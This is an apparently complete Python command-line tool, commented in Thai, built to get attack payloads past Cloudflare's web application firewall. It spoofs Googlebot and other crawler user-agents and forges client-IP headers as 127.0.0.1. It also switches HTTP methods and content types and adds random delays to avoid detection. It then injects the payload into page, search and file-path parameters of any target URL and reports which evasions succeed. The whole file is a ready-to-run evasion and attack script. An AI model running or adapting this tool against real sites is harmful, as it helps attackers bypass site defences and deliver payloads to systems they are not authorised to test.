#!/usr/bin/env python3
"""
Cloudflare Bypass Tool - เครื่องมือเฉพาะสำหรับการ bypass Cloudflare protection
"""

import requests
import time
import random
import string
import json
from typing import List, Dict, Any

class CloudflareBypass:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        
    def generate_random_headers(self) -> Dict[str, str]:
        """สร้าง headers แบบสุ่มเพื่อหลีกเลี่ยงการตรวจจับ"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
        ]
        
        accept_languages = [
            'en-US,en;q=0.9',
            'th-TH,th;q=0.9,en;q=0.8',
            'en-GB,en;q=0.9',
            'de-DE,de;q=0.9,en;q=0.8',
            'fr-FR,fr;q=0.9,en;q=0.8',
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(accept_languages),
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
        }
    
    def test_cloudflare_bypass_techniques(self, payload: str) -> List[Dict[str, Any]]:
        """ทดสอบเทคนิคการ bypass Cloudflare ต่างๆ"""
        print(f"[+] ทดสอบ Cloudflare bypass สำหรับ payload: {payload}")
        
        bypass_techniques = [
            # 1. Bot User-Agents
            {
                'name': 'Google Bot',
                'headers': {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
            },
            {
                'name': 'Bing Bot',
                'headers': {'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'}
            },
            {
                'name': 'Baidu Bot',
                'headers': {'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'}
            },
            
            # 2. IP Spoofing Headers
            {
                'name': 'X-Forwarded-For Local',
                'headers': {'X-Forwarded-For': '127.0.0.1'}
            },
            {
                'name': 'X-Real-IP Local',
                'headers': {'X-Real-IP': '127.0.0.1'}
            },
            {
                'name': 'CF-Connecting-IP Local',
                'headers': {'CF-Connecting-IP': '127.0.0.1'}
            },
            
            # 3. Mobile User-Agents
            {
                'name': 'Mobile Chrome',
                'headers': {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36'}
            },
            {
                'name': 'Mobile Safari',
                'headers': {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'}
            },
            
            # 4. Accept Headers Manipulation
            {
                'name': 'Plain Text Accept',
                'headers': {'Accept': 'text/plain,text/html'}
            },
            {
                'name': 'Wildcard Accept',
                'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
            },
            
            # 5. Language Headers
            {
                'name': 'Thai Language',
                'headers': {'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8'}
            },
            {
                'name': 'German Language',
                'headers': {'Accept-Language': 'de-DE,de;q=0.9,en;q=0.8'}
            },
            
            # 6. Combined Techniques
            {
                'name': 'Bot + Local IP',
                'headers': {
                    'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                    'X-Forwarded-For': '127.0.0.1'
                }
            },
            {
                'name': 'Mobile + Local IP',
                'headers': {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36',
                    'X-Real-IP': '127.0.0.1'
                }
            },
        ]
        
        results = []
        test_urls = [
            f"{self.target_url}/index.php?page={payload}",
            f"{self.target_url}/search?q={payload}",
            f"{self.target_url}/file?path={payload}",
        ]
        
        for technique in bypass_techniques:
            print(f"  [-] ทดสอบ: {technique['name']}")
            
            for test_url in test_urls:
                try:
                    # สร้าง session ใหม่สำหรับแต่ละเทคนิค
                    test_session = requests.Session()
                    test_session.headers.update(technique['headers'])
                    
                    # เพิ่ม delay แบบสุ่ม
                    time.sleep(random.uniform(1, 3))
                    
                    response = test_session.get(test_url, timeout=15)
                    
                    result = {
                        'technique': technique['name'],
                        'url': test_url,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'is_blocked': self._is_blocked(response),
                        'response_preview': response.text[:300] + '...' if len(response.text) > 300 else response.text,
                        'headers_used': technique['headers']
                    }
                    results.append(result)
                    
                    if not result['is_blocked'] and response.status_code == 200:
                        print(f"    [+] สำเร็จ! {test_url}")
                        print(f"        Status: {response.status_code}, Length: {len(response.text)}")
                    
                except Exception as e:
                    print(f"    [-] Error: {e}")
                    results.append({
                        'technique': technique['name'],
                        'url': test_url,
                        'error': str(e),
                        'headers_used': technique['headers']
                    })
        
        return results
    
    def _is_blocked(self, response) -> bool:
        """ตรวจสอบว่าถูกบล็อกหรือไม่"""
        blocked_indicators = [
            'cloudflare',
            '403 forbidden',
            'attention required',
            'sorry, you have been blocked',
            'unable to access',
            'security service',
            'online attacks'
        ]
        
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in blocked_indicators)
    
    def test_advanced_bypass(self, payload: str) -> List[Dict[str, Any]]:
        """ทดสอบเทคนิคการ bypass แบบขั้นสูง"""
        print(f"[+] ทดสอบเทคนิคการ bypass แบบขั้นสูง...")
        
        advanced_techniques = [
            # 1. HTTP Method Manipulation
            {
                'name': 'POST Method',
                'method': 'POST',
                'data': {'page': payload}
            },
            {
                'name': 'PUT Method',
                'method': 'PUT',
                'data': {'page': payload}
            },
            
            # 2. Content-Type Manipulation
            {
                'name': 'JSON Content-Type',
                'method': 'POST',
                'headers': {'Content-Type': 'application/json'},
                'data': json.dumps({'page': payload})
            },
            {
                'name': 'XML Content-Type',
                'method': 'POST',
                'headers': {'Content-Type': 'application/xml'},
                'data': f'<request><page>{payload}</page></request>'
            },
        ]
        
        results = []
        base_url = f"{self.target_url}/index.php"
        
        for technique in advanced_techniques:
            print(f"  [-] ทดสอบ: {technique['name']}")
            
            try:
                test_session = requests.Session()
                test_session.headers.update(self.generate_random_headers())
                
                if 'headers' in technique:
                    test_session.headers.update(technique['headers'])
                
                time.sleep(random.uniform(2, 4))
                
                if technique['method'] == 'GET':
                    response = test_session.get(f"{base_url}?page={payload}", timeout=15)
                else:
                    response = test_session.request(
                        technique['method'],
                        base_url,
                        data=technique['data'],
                        timeout=15
                    )
                
                result = {
                    'technique': technique['name'],
                    'method': technique['method'],
                    'url': base_url,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'is_blocked': self._is_blocked(response),
                    'response_preview': response.text[:300] + '...' if len(response.text) > 300 else response.text
                }
                results.append(result)
                
                if not result['is_blocked'] and response.status_code == 200:
                    print(f"    [+] สำเร็จ! Method: {technique['method']}")
                    print(f"        Status: {response.status_code}, Length: {len(response.text)}")
                
            except Exception as e:
                print(f"    [-] Error: {e}")
                results.append({
                    'technique': technique['name'],
                    'method': technique['method'],
                    'error': str(e)
                })
        
        return results
    
    def run_comprehensive_bypass(self, payload: str) -> Dict[str, Any]:
        """รันการ bypass แบบครอบคลุม"""
        print(f"[+] เริ่มการ bypass Cloudflare สำหรับ: {self.target_url}")
        print("=" * 60)
        
        results = {
            'target_url': self.target_url,
            'payload': payload,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'basic_bypass': self.test_cloudflare_bypass_techniques(payload),
            'advanced_bypass': self.test_advanced_bypass(payload)
        }
        
        # สรุปผลลัพธ์
        print("\n" + "=" * 60)
        print("สรุปผลการ bypass:")
        
        successful_basic = sum(1 for r in results['basic_bypass'] if not r.get('is_blocked', True) and r.get('status_code') == 200)
        successful_advanced = sum(1 for r in results['advanced_bypass'] if not r.get('is_blocked', True) and r.get('status_code') == 200)
        
        print(f"Basic bypass techniques: {successful_basic} successful")
        print(f"Advanced bypass techniques: {successful_advanced} successful")
        
        if successful_basic > 0 or successful_advanced > 0:
            print("\n[+] เทคนิคที่สำเร็จ:")
            for r in results['basic_bypass'] + results['advanced_bypass']:
                if not r.get('is_blocked', True) and r.get('status_code') == 200:
                    print(f"  - {r.get('technique', 'Unknown')}: {r.get('url', 'N/A')}")
        
        return results

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Cloudflare Bypass Tool')
    parser.add_argument('url', help='URL เป้าหมาย')
    parser.add_argument('payload', help='Payload ที่ต้องการทดสอบ')
    parser.add_argument('-o', '--output', help='ไฟล์ output (JSON)')
    
    args = parser.parse_args()
    
    bypass_tool = CloudflareBypass(args.url)
    results = bypass_tool.run_comprehensive_bypass(args.payload)
    
    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        print(f"\n[+] บันทึกผลลัพธ์ลงไฟล์: {args.output}")

if __name__ == "__main__":
    main()